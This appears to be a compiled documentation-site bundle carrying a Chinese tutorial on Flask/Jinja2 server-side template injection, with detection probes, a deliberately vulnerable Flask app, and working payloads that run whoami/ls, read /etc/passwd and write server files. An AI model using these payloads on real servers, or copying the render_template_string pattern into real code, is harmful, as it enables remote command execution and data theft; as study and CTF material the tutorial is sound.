import{_ as t,W as p,X as e,Y as n,a2 as o,a1 as a,Z as s}from"./framework-b6a07282.js";const c="/assets/1-eef305db.png",l="/assets/2-8af4a70e.png",i="/assets/3-f9354ee1.jpg",u="/assets/4-92b66ef7.jpg",r="/assets/5-f6f4098c.jpg",k="/assets/6-cd48f834.jpg",d={},_=a('<h2 id="ssti模板注入" tabindex="-1"><a class="header-anchor" href="#ssti模板注入" aria-hidden="true">#</a> SSTI模板注入</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>SSTI模板注入漏洞是一种服务器端的注入漏洞。</li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ul><li>没有对用户的输入进行合适的过滤或转义，将用户的输入被当作模板代码来执行。就可能导致恶意用户在服务器端执行任意代码</li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><ul><li><p>用户输入的变量中插入特定的payload，然后观察服务器的返回内容是否包含模板语法或异常信息。不同的模板引擎可能有不同的payload和上下文，需要根据具体情况进行调整</p></li><li><p>基本决策树方法，只能进行简单评估所回显的模板类型，此图模板类型不全。</p></li></ul><img src="'+c+'"><ul><li>模板引擎大全</li></ul><img src="'+l+`"><h4 id="jinja模板" tabindex="-1"><a class="header-anchor" href="#jinja模板" aria-hidden="true">#</a> Jinja模板</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.url?参数={{9*9}} #查看是否被执行，如果被执行则存在SSTI模板注入
2.url{{9*9}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+i+`"><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ol><li>读取或修改服务器上的文件</li><li>执行任意命令或代码</li><li>获取敏感信息，如数据库凭证、会话ID等</li><li>绕过防火墙或其他安全措施</li><li>发起内网渗透或远程控制</li></ol><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><h4 id="python模板" tabindex="-1"><a class="header-anchor" href="#python模板" aria-hidden="true">#</a> Python模板</h4><h5 id="jinja当中的敏感函数或方法" tabindex="-1"><a class="header-anchor" href="#jinja当中的敏感函数或方法" aria-hidden="true">#</a> Jinja当中的敏感函数或方法</h5><p>Python当中有很多敏感函数或类，它们可以用来执行系统命令、读写文件、动态加载模块、执行任意代码等等。一些常见的敏感函数或类有：</p><ul><li><code>__import__</code>：可以导入任意模块</li><li><code>eval</code>：可以执行任意代码</li><li><code>exec</code>：可以执行任意系统命令</li><li><code>open</code>：可以打开任意文件</li><li><code>os</code>：可以调用操作系统相关的函数</li><li><code>subprocess</code>：可以执行系统命令</li><li><code>os.popen</code>：可以执行任意系统命令</li></ul><h5 id="一般思路" tabindex="-1"><a class="header-anchor" href="#一般思路" aria-hidden="true">#</a> 一般思路</h5><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.随便找一个内置类对象用__class__拿到他所对应的类
2.用__bases__拿到基类（&lt;class ‘object’&gt;）
3.用__subclasses__()拿到子类列表
4.在子类列表中直接寻找敏感函数或方法、类
根据上述4种步骤，来进行测试：
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><table><thead><tr><th>描述</th><th>结果</th></tr></thead><tbody><tr><td>1.使用__class__来获取s对应的类为str</td><td><img src="`+u+'"></td></tr><tr><td>2.使用__base__来获取str继承的类为object</td><td><img src="'+r+'"></td></tr><tr><td>3.使用_<em>subclasses</em>_()来获取object的所有子类</td><td><img src="'+k+'"></td></tr><tr><td>4. 可在这里寻找所有可利用类</td><td></td></tr></tbody></table><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3>',24),v=n("li",null,[s("避免使用"),n("code",null,"render_template_string"),s("函数，并且对用户输入进行过滤和转义。")],-1),b=n("li",null,"减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式",-1),m=n("li",null,"使用安全的模板引擎，比如Jinja2等",-1),g=n("li",null,"尽可能加载静态模板文件",-1),h=a(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>

app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">str</span><span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;s&#39;</span><span class="token punctuation">)</span>
    html <span class="token operator">=</span> <span class="token string">&quot;&lt;h1&gt;Welcome1&lt;/h1&gt;&lt;/br&gt;&lt;p&gt;{{%s}}&lt;/p&gt;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3><ul><li>暂无</li></ul><h3 id="flask简介" tabindex="-1"><a class="header-anchor" href="#flask简介" aria-hidden="true">#</a> Flask简介</h3><ul><li><p>Flask是一个Python上的<strong>Web应用程序框架</strong>（Web Application Framework）。</p></li><li><p><strong>Web应用程序框架</strong>是一个库和模块的集合，使WEB应用程序开发人员能够编写Web应用程序，而不必担心协议，线程管理等底层细节。</p></li><li><p>Flask基于Werkzeug WSGI工具包和Jinjia2模板引擎 <strong>Werkzeug</strong>：它是一个WSGI工具包，它实现了请求，响应对象和实用函数。这使得能够在其上构建web框架。Flask框架使用Werkzeug作为其基础之一。 <strong>Jinja2</strong>：Jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p></li><li><p>Flask通常被称为微框架。它在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。但Flask支持以扩展的形式向应用程序添加此类功能。</p></li></ul><h4 id="jinja模板引擎特点" tabindex="-1"><a class="header-anchor" href="#jinja模板引擎特点" aria-hidden="true">#</a> Jinja模板引擎特点</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{{ ... }}：转载一个变量，模板渲染的时候，会使用传进来的同名参数将这个变量代表的值替换掉。
{% ... %}：转载一个控制语句。
{# ... #}：装载一个注释，模板渲染的时候会忽视这中间的值。

控制语句：
Jinja控制语句都是放在{% ... %}中，并且有一个语句{% endxxx %}来进行结束

Jinja2中for循环内置常量
loop.index		当前迭代的索引（从1开始）
loop.index()	当前迭代的索引（从0开始）
loop.first		是否是第一次迭代，返回True或False
loop.last		是否是最后一次迭代，返回True或False
loop.length	 	序列的长度
注意：不可以使用continue和break表达式来控制循环的执行。

过滤器
过滤器是通过（|）符号进行使用的，例如：{{ name|length }} 返回name的长度。
过滤器相当于是一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回响应的值，之后再将结果渲染到页面中。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="ssti漏洞的产生" tabindex="-1"><a class="header-anchor" href="#ssti漏洞的产生" aria-hidden="true">#</a> SSTI漏洞的产生</h3><ul><li>SSTI漏洞产生于网页模板中的变量被二次渲染时。</li><li>什么是二次渲染，这里用两个例子简单展示</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#无二次渲染行为：</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>
app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token builtin">str</span><span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;s&#39;</span><span class="token punctuation">)</span>
    html<span class="token operator">=</span><span class="token string">&quot;&lt;h1&gt;Welcome&lt;/h1&gt;&lt;/br&gt;&lt;p&gt;{{str}}&lt;/p&gt;&quot;</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
<span class="token comment">#存在二次渲染</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>
app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">str</span><span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;s&#39;</span><span class="token punctuation">)</span>
    html <span class="token operator">=</span> <span class="token string">&quot;&lt;h1&gt;Welcome&lt;/h1&gt;&lt;/br&gt;&lt;p&gt;%s&lt;/p&gt;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果在页面中找到了这样一个ssti漏洞，便意味着我们能够在这个注入点执行模板引擎的控制语句以及命令</p><p>Flask SSTI题的基本思路就是利用python中的<strong>魔术方法</strong>找到自己要用的函数</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>__class__：用于获取当前对象所对应的类
__base__：返回一个类所直接继承的类
__mro__：返回一个类所继承的所有类
<span class="token comment">#__base__和__mro__都是用来寻找基类的</span>
__dict__：返回当前类的函数、全局变量、属性等
__init__：所有类都具有__init__方法，便于利用他来作为跳板访问__globals__
__globals__：function<span class="token punctuation">.</span>__globals__，用于获取function所处空间下可适用的module、方法以及所有变量。
__builtins__：获取Python内置的方法比如<span class="token builtin">ord</span>，<span class="token builtin">chr</span>等
__bases__：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组
__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>：获取类的所有子类
一切类都继承自Object，所以最终都可以获取到Object类
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="敏感函数" tabindex="-1"><a class="header-anchor" href="#敏感函数" aria-hidden="true">#</a> 敏感函数</h4><h5 id="object子类" tabindex="-1"><a class="header-anchor" href="#object子类" aria-hidden="true">#</a> Object子类</h5><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;class &#39;site._Printer&#39;&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="globals全局变量" tabindex="-1"><a class="header-anchor" href="#globals全局变量" aria-hidden="true">#</a> Globals全局变量</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>os，eval，exec，&lt;type &#39;file&#39;&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="基本步骤" tabindex="-1"><a class="header-anchor" href="#基本步骤" aria-hidden="true">#</a> 基本步骤</h4><ul><li>探测漏洞</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token number">1.</span>
url?参数<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">9</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment">#查看是否被执行，如果被执行则存在SSTI模板注入</span>
url<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">9</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token number">2.</span>
url?参数<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>config<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment">#访问flask模块的全局变量config</span>
url<span class="token punctuation">{</span><span class="token punctuation">{</span>config<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token operator">/</span>shrine<span class="token operator">/</span><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&#39;current_app&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">&#39;FLAG&#39;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&#39;current_app&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>FLAG<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>request<span class="token punctuation">.</span>application<span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>_get_data_for_json<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&#39;json&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>JSONEncoder<span class="token punctuation">.</span>default<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&#39;current_app&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">&#39;FLAG&#39;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>获取对象类</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__	<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">&#39;str&#39;</span><span class="token operator">&gt;</span>	<span class="token comment">#字符串</span>
<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__	<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">&#39;tuple&#39;</span><span class="token operator">&gt;</span>	<span class="token comment">#元组</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__	<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">&#39;list&#39;</span><span class="token operator">&gt;</span>	<span class="token comment">#列表</span>
<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__	<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">&#39;str&#39;</span><span class="token operator">&gt;</span>	<span class="token comment">#字符串</span>


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>获取基类</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">}</span><span class="token punctuation">}</span>	<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">&#39;object&#39;</span><span class="token operator">&gt;</span>
类型对象的全部基类，以元组形式，类型的实例通常没有属性

<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">}</span><span class="token punctuation">}</span>	<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">&#39;str&#39;</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">&#39;object&#39;</span><span class="token operator">&gt;</span><span class="token punctuation">)</span> 
此属性是由类组成的元组，在方法解析期间会基于它来查找基类

<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>	<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">&#39;object&#39;</span><span class="token operator">&gt;</span>

 <span class="token operator">//</span>针对不同的网站需要对索引进行修改，直到返回的类为<span class="token builtin">object</span>
<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
request<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>获取子类</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
可以从返回的子类中找到可以利用的类，有可能存在可利用的函数，如<span class="token builtin">file</span>，<span class="token builtin">eval</span>，<span class="token keyword">exec</span>，os等，但一般是没有写的。

可以用下面模板控制语句找找看：
<span class="token punctuation">{</span><span class="token operator">%</span><span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">&#39;__builtins__&#39;</span> <span class="token keyword">in</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>globals__<span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>loop<span class="token punctuation">.</span>index0 <span class="token operator">~</span><span class="token string">&#39;_&#39;</span><span class="token operator">~</span>c<span class="token punctuation">.</span>__name__<span class="token operator">~</span><span class="token string">&#39;-&#39;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">else</span> <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">&#39;-&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">%</span>endif<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="payload" tabindex="-1"><a class="header-anchor" href="#payload" aria-hidden="true">#</a> Payload</h4><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>命令执行：
<span class="token number">1</span><span class="token punctuation">.</span>windows<span class="token punctuation">,</span>linux可用
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__ <span class="token operator">==</span> <span class="token string">&#39;catch_warnings&#39;</span> <span class="token operator">%</span><span class="token punctuation">}</span>
    <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
      <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> b<span class="token punctuation">.</span>__class__ <span class="token operator">==</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__ <span class="token operator">%</span><span class="token punctuation">}</span>
       <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">&#39;eval&#39;</span> <span class="token keyword">in</span> b<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
         <span class="token punctuation">{</span><span class="token punctuation">{</span> b<span class="token punctuation">[</span><span class="token string">&#39;eval&#39;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
       <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
    <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
   <span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>

<span class="token number">2</span><span class="token punctuation">.</span>linux可用
<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&#39;os&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&#39;whoami&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#存在os时使用</span>
<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">177</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&quot;__builtins__&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;</span><span class="token punctuation">)</span> <span class="token comment">#存在eval时使用</span>
<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&#39;type file数字&#39;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#39;/etc/passwd&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#存在&lt;type &#39;file&#39;&gt;时使用</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#39;/var/www/html/input&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;w&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&#39;123&#39;</span><span class="token punctuation">)</span>
